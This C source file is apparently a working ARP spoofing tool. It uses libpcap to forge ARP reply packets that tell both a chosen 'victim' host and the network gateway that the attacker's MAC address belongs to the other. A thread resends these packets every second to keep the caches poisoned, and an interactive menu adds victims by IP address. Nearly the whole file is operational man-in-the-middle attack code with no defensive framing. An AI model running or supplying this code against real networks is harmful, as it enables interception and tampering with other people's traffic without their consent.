#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <pcap.h>
#include <pthread.h>
#include <unistd.h>
#include <linux/if_ether.h>
#include "InitPcap.h"
#include "GetNetworkInfo.h"
#include "AttackInfo.h"

BYTE gLocalMAC[6];
BYTE gGatewayIP[4];
BYTE gGatewayMAC[6];

void MakeARPReplyPacket(BYTE* localMac, BYTE* victimMac, BYTE* gatewayIP, BYTE* victimIP, BYTE* arpReplyPacket)
{
    int i = 0;
    int packetIdx = 0;

    // set ethernet header
    for (i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = victimMac[i];
    for (i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = localMac[i];
    arpReplyPacket[packetIdx++] = 0x08; // type : ARP
    arpReplyPacket[packetIdx++] = 0x06;

    // set ARP header
    arpReplyPacket[packetIdx++] = 0x00; // Hardware Type : Ethernet
    arpReplyPacket[packetIdx++] = 0x01;
    arpReplyPacket[packetIdx++] = 0x08; // Protocol Type : IPv4
    arpReplyPacket[packetIdx++] = 0x00;
    arpReplyPacket[packetIdx++] = 0x06; // Hardware Size : 6
    arpReplyPacket[packetIdx++] = 0x04; // Protocol Size : 4
    arpReplyPacket[packetIdx++] = 0x00; // Opcode : Reply
    arpReplyPacket[packetIdx++] = 0x02;
    for (i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = localMac[i];
    for (i = 0; i < 4; i++) arpReplyPacket[packetIdx++] = gatewayIP[i];
    for (i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = victimMac[i];
    for (i = 0; i < 4; i++) arpReplyPacket[packetIdx++] = victimIP[i];
}

static void *ArpSenderThread(void *arg)
{
    pcap_t** handle = arg;
    BYTE arpReplyPacket[42];
    int i = 0;

    while (1)
    {
        for (i = 0; i < ATTACK_TABLE_MAX; i++)
        {
            if (gAttackInfoArr[i].set == 1)
            {
                // arp response to sender
                MakeARPReplyPacket(gLocalMAC, gAttackInfoArr[i].mac, gGatewayIP, gAttackInfoArr[i].ip, arpReplyPacket);
                pcap_sendpacket(*handle, arpReplyPacket, 42);
                // arp response to receiver
                MakeARPReplyPacket(gLocalMAC, gGatewayMAC, gAttackInfoArr[i].ip, gGatewayIP, arpReplyPacket);
                pcap_sendpacket(*handle, arpReplyPacket, 42);
            }
        }

        sleep(1);
    }

    return 0;
}


int main(int argc, char** argv)
{
    pcap_t* handle;
    BYTE localMac[6] = {0,};
    BYTE victimMac[6] = {0,};
    BYTE victimIP[4];
    char userInput[20];

    if (GetLocalMacAddress(gLocalMAC))
    {
        printf("[*] local MAC address - %x:%x:%x:%x:%x:%x\n", gLocalMAC[0], gLocalMAC[1], gLocalMAC[2], gLocalMAC[3], gLocalMAC[4], gLocalMAC[5]);
    }
    else
    {
        printf("Get local MAC address fail\n");
        exit(-1);
    }

    if (GetGatewayIP(gGatewayIP))
    {
        printf("[*] gateway IP - %d.%d.%d.%d\n", gGatewayIP[0], gGatewayIP[1], gGatewayIP[2], gGatewayIP[3]);
    }
    else
    {
        printf("Get gateway IP fail\n");
        exit(-1);
    }

    if (GetMacAddressFromByte(gGatewayIP, gGatewayMAC))
    {
        printf("[*] gateway MAC - %02x:%02x:%02x:%02x:%02x:%02x\n", gGatewayMAC[0], gGatewayMAC[1], gGatewayMAC[2], gGatewayMAC[3], gGatewayMAC[4], gGatewayMAC[5]);
    }
    else
    {
        printf("get mac address fail\n");
        exit(-1);
    }

    if (InitPcap(&handle))
    {
        pthread_t threadId;
        pthread_attr_t attr;

        if (pthread_attr_init(&attr) == 0 &&
            pthread_create(&threadId, &attr, &ArpSenderThread, &handle) == 0)
        {
            printf("[*] arp sender thread execute success\n");
        }
        else
        {
            // attr close;
            printf("arp sender thread execute fail\n");
            exit(-1);
        }


        while (1)
        {
            printf("1. add victim\n");
            printf("2. del victim\n");
            printf("3. exit\n");
            fgets(userInput, 20, stdin);

            if (userInput[0] == '1')
            {
                printf("input IP\n>>");
                fgets(userInput, 20, stdin);
                userInput[strlen(userInput) - 1] = '\0';

                if (!ConvertAddrToByteIP(userInput, victimIP))
                {
                    printf("invalid IP\n");
                    continue;
                }

                if (GetMacAddress(userInput, victimMac))
                {
                    printf("[*] victim MAC - %x:%x:%x:%x:%x:%x\n", victimMac[0], victimMac[1], victimMac[2], victimMac[3], victimMac[4], victimMac[5]);
                }
                else
                {
                    printf("Get victim MAC address fail : Invalid IP address\n");
                    continue;
                }

                if (InsertAttackInfo(victimIP, victimMac))
                {
                    printf("ARP spoofing to %s\n", userInput);
                }
            }
        }
    }

    return 0;
}
